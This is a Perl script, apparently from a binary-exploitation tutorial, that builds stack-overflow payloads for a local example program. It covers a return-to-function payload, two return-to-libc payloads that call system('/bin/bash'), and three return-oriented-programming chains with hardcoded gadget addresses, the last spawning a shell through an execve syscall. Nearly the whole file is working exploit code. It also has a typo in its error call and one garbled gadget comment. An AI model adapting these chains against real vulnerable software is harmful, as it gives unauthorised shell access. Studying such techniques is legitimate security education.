#!/usr/bin/perl

sub usage { return "Usage: $0 bar|libc-1|libc-2|rop-1|rop-2|rop-3\n"; }

$buf_base = 0xffffcc06;  # &buf[0] in func()
$system   = 0x08052770;  # nm example3 | grep __libc_system
$bar      = 0x08049865;  # nm example3 | grep bar

sub p { return pack('I!', $_[0]); }


$example = shift or die usafe();
if ($example =~ /^bar$/i) {
  # 0.1 ... return-to-bar example ...
  $stack = ('A' x 0x16);
  $stack .= p($bar);
} elsif ($example =~ /^libc-1$/i) {
  # 0.2 ... First return-to-libc example ...
  $stack  = "\/bin\/bash\0";
  $stack .= 'A' x (0x16-length($stack));
  $stack .= p($system);
  $stack .= p(0xdeadbeef);
  $stack .= p($buf_base);
} elsif ($example =~ /^libc-2$/i) {
  # 0.2 ... Second return-to-libc example ...
  $stack = ('A' x 0x16);
  $stack .= p($system);
  $stack .= p(0xdeadbeef);
  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
  $stack .= '/bin/bash';
} elsif ($example =~ /^rop-1$/i) { 
  # 0.3 ... First ROP example ...
  $stack = ('A' x 0x16);
  $stack .= p(0x08049a90); # pop edi; ret;
  $stack .= p($system);
  $stack .= p(0x08055281); # call edi;
  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
  $stack .= '/bin/bash';
} elsif ($example =~ /^rop-2$/i) { 
  # 0.3 ... Second ROP example ...
  $stack = ('A' x 0x16);
  $stack .= p(0x080b265a); # pop eax; ret;
  $stack .= p(0x0806df0d); #                                 # eax = 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
  $stack .= p(0x0807df05); # push esp; call eax;             # after the call edi = esp we pushed
  $stack .= p(0xdeadbeef); #                                 
  $stack .= p(0x08068444); # mov eax, edi; pop edi; ret;     # eax = edi
  $stack .= p(0xdeadbeef); #
  $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
  $stack .= p(0x0000002c); #                                 # edx = difference between esp and /bin/bash string at end of payload
  $stack .= p(0xdeadbeef); #
  $stack .= p(0xdeadbeef); #
  $stack .= p(0x0806b623); # add eax, edx; ret;              # eax now points to /bin/bash string
  $stack .= p(0x080496c9); # pop esi; ret;
  $stack .= p($system);    # address of system               # esi = &system
  $stack .= p(0x08055064); # push eax; call esi;
  $stack .= '/bin/bash';
} elsif ($example =~ /^rop-3$/i) { 
  # 0.4 ... Final ROP example ...
  # Note the assembly in comments is in Intel style (ropper default)

  # $eax = $esp+$_[0]
  # clobbers: $esi, $edi, $ebx, $edx
  sub set_eax_to_str {
    # $edi = $esp:
    $stack .= p(0x080b265a); # pop eax; ret;
    $stack .= p(0x0806df0d); # 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
    $stack .= p(0x0807df05); # push esp; call eax;
    $stack .= p(0xdeadbeef); #                                 
    # $eax = $edi:
    $stack .= p(0x08068444); # mov edi, eax, edi; pop edi; ret;
    $stack .= p(0xdeadbeef); #
    # $edx = offset (difference between esp and /bin/bash string at end of payload):
    $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
    $stack .= p($_[0]);      # offset
    $stack .= p(0xdeadbeef); #
    $stack .= p(0xdeadbeef); #
    # $eax += $edx:
    $stack .= p(0x0806b623); # add eax, edx; ret;
  }

  # $ebx = $eax
  # clobbers: $esi
  sub set_ebx_to_eax {
    $stack .= p(0x080496c9); # pop esi; ret;
    $stack .= p(0x08065e3c); # esi -> pop esi; pop ebx; ret;
    $stack .= p(0x08055064); # push eax; call esi;
  }

  # $edx = 0
  # clobbers: $edi, $ebp, $eax
  sub clear_edx {
    $stack .= p(0x08059849); # mov edx, 0xffffffff; ret;
    $stack .= p(0x08049a90); # pop edi; ret;
    $stack .= p(0xffffffff);
    $stack .= p(0x08056e82); # sub edx, edi; pop edi; pop ebp; mov eax, edx; ret;
    $stack .= p(0xdeadbeef);
    $stack .= p(0xdeadbeef);
  }
  
  # $eax = $_[]
  # clobbers: $esi, $esi, $edi
  sub set_eax {
    $stack .= p(0x080496c9); # pop esi; ret;                            
    $stack .= p($_[0]);
    $stack .= p(0x0806b6b3); # mov eax, esi; pop esi; pop edi; ret;
    $stack .= p(0xdeadbeef);
    $stack .= p(0xdeadbeef);
  }

  $stack = ('A' x 0x16);
  # $ebx -> /bin/bash:
  set_eax_to_str(0x0000005c); # 0x5c is the offset (computed in gdb)
  set_ebx_to_eax();
  # $edx = 0:
  clear_edx();
  # $eax = 0xb (execve syscall number; grep xecve /usr/include/asm/unistd_32.h)
  set_eax(0x0000000b);
  # $ecx = 0; int 0x80:
  $stack .= p(0x0804af6f); # xor ecx, ecx; int 0x80;
  $stack .= '/bin/bash';
} else {
  die usage();
}

print $stack;
